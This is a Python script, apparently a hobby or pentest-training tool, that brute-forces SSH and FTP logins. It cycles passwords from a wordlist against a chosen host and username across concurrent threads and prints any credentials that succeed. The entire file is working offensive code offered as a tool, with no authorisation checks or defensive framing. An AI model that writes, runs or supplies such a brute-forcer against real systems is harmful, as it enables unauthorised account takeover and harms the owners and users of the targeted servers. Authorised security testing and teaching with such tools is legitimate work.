from termcolor import colored
import argparse
import concurrent.futures
from threading import Event

# Networking protocol libraries
import paramiko
from ftplib import FTP, error_reply, error_perm
from socket import timeout

# Custom code
from wordlists import chunk_wordlist
from port_scan import validate_host, split_ports


def split_protocol_and_host(target_host):
    # Split protocol and host into distinct parts
    try:
        protocol_and_host = target_host.split('://')

        # Confirm what is assumed to be the protocol and target host are present
        if len(protocol_and_host) == 2:
            protocol = protocol_and_host[0]
            target_host = protocol_and_host[1]
            return protocol, target_host
        
        # In case target host doesn't have the expected 2 parts
        else:
            print(colored('[--] Invalid target format', 'red'))
            exit()

    except TypeError:
        print(colored('[--] Invalid target format', 'red'))
        
    except AttributeError:
        print(colored('[--] Invalid target format', 'red'))        
    
    exit()


def normalize_protocol(protocol):
    try:
        protocol = protocol.lower()
        return protocol
    except AttributeError:
        print(colored('[--] Unsupported protocol specified in target', 'red'))
        exit()



def validate_protocol(protocol):
    supported_protocols = ("ssh", 'ftp')
    protocol_default_ports = {'ssh': 22, 'ftp': 21}

    # Confirm protocol is supported by this script
    if protocol in supported_protocols:
        target_specification = {'protocol': protocol, 'port':protocol_default_ports[protocol]}
        return target_specification
    
    # In case target protocol isn't supported
    else:
        print(colored('[--] Unsupported protocol specified in target', 'red'))
        exit()



def validate_target(target_host, port):

    # Split protocol and target from input of protocol://host
    protocol, target_host = split_protocol_and_host(target_host)
    

    # Confirm host is resolvable DNS address or IPv4 address
    target_host = validate_host(target_host)

    # Confirm protocol is supported by this script
    target_specification = validate_protocol(protocol)
    target_specification['target_host'] = target_host
    

    # If custom port was passed
    if port:
        # Prepare port for processing
        target_port = split_ports(port)
        if len(target_port) == 1:
            target_port = target_port[0]

            # Update target specification
            target_specification['port'] = target_port
        
        else:
            print(colored("[!!] invalid port specified", 'red'))
            exit()

    return target_specification


def connect_to_ssh(target_host, ssh_port, username, password, event, show_attempts):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target_host, port=ssh_port, username=username, password=password)
        print(colored(("[+] Found password: {}".format(password)), 'light_green'))
        print(colored(("[++] SSH Credentials: {}:{}".format(username,password)), 'blue'))
        event.set()
    except paramiko.ssh_exception.AuthenticationException:
        if not event.is_set() and show_attempts:
            print(colored(("[-] Incorrect password: {}".format(password)), 'light_red'))
    
    except paramiko.ssh_exception.BadAuthenticationType:
        print(colored("[--] The host doesn't appear to allow password based authentication", 'red'))
        event.set()
    
    except paramiko.ssh_exception.NoValidConnectionsError:
        print(colored("[--] Unable to connect to SSH service on the specified port", 'red'))
        event.set()

    except paramiko.ssh_exception.BadHostKeyException:
        print(colored("[--] The SSH server on the target has returned an unexpected host key", 'red'))
        event.set()
    ssh.close()



def brute_force_ssh(target_host, ssh_port, username, wordlist_chunk, event, show_attempts):
    for password in wordlist_chunk:
        if not event.is_set():
            connect_to_ssh(target_host, ssh_port, username, password[0], event, show_attempts)



def connect_to_ftp(target_host, ftp_port, username, password, event, show_attempts, ftp):
    try:
        ftp.connect(target_host, port=ftp_port) 
        ftp.login(user=username, passwd=password)
        print(colored(("[+] Found password: {}".format(password)), 'light_green'))
        print(colored(("[++] FTP Credentials: {}:{}".format(username,password)), 'blue'))
        event.set()
        ftp.quit()
    except error_perm:
        if not event.is_set() and show_attempts:
            print(colored(("[-] Incorrect password: {}".format(password)), 'light_red'))
        ftp.quit()
    except error_reply:
        print(colored("[--] Unexpected reply received from the target", 'red'))
        event.set()

    except timeout:
        print(colored("[--] Connection timed out. Verify the target host and port!", 'red'))

    except OSError as error:
        if error.errno == 113:
            print(colored("[--] No route to target. Verify the target host!", 'red'))

        else:
            print(colored("[--] Unexpected OS error has occurred", 'red'))
            print(error)

        event.set()

    except Exception as e:
        print(colored("[---] Unexpected exception has occurred...", 'red'))
        print(e)
        event.set()



def brute_force_ftp(target_host, ftp_port, username, wordlist_chunk, event, show_attempts):
    ftp = FTP(timeout=5)
    for password in wordlist_chunk:
        if not event.is_set():
            connect_to_ftp(target_host, ftp_port, username, password[0], event, show_attempts, ftp)



def main():
    parser = argparse.ArgumentParser(add_help=True)
    parser.add_argument("target_host", help="Specify target host in the format protocol://host", type=str)
    parser.add_argument("-p", dest="service_port", help="Target port", default=False, type=str)
    parser.add_argument('-u', dest='username', help='Username', type=str, required=True)
    parser.add_argument('-w', dest='wordlist', help='Wordlist with passwords', type=str, required=True)
    parser.add_argument('-t', dest='threads', help='Number of concurrent connections', type=int, default=4)
    parser.add_argument('-a', dest='show_attempts', help='Show all attempted logins', default=False, action='store_true')
    args = parser.parse_args()

    print(args.service_port)
    target_specification = validate_target(args.target_host, args.service_port)
    all_wordlist_chunks = chunk_wordlist(args.wordlist, args.threads)

    finished = Event()
    protocol = target_specification['protocol']

    if protocol == 'ssh':
        print(colored("[++] Brute forcing SSH", 'blue'))
        with concurrent.futures.ThreadPoolExecutor() as executor:
            for wordlist_chunk in all_wordlist_chunks:
                executor.submit(brute_force_ssh, target_specification['target_host'], target_specification['port'], args.username, wordlist_chunk, finished, args.show_attempts)
    
    elif protocol == 'ftp':
        print(colored("[++] Brute forcing FTP", 'blue'))
        with concurrent.futures.ThreadPoolExecutor() as executor:
            for wordlist_chunk in all_wordlist_chunks:
                executor.submit(brute_force_ftp, target_specification['target_host'], target_specification['port'], args.username, wordlist_chunk, finished, args.show_attempts)



if __name__ == '__main__':
	main()

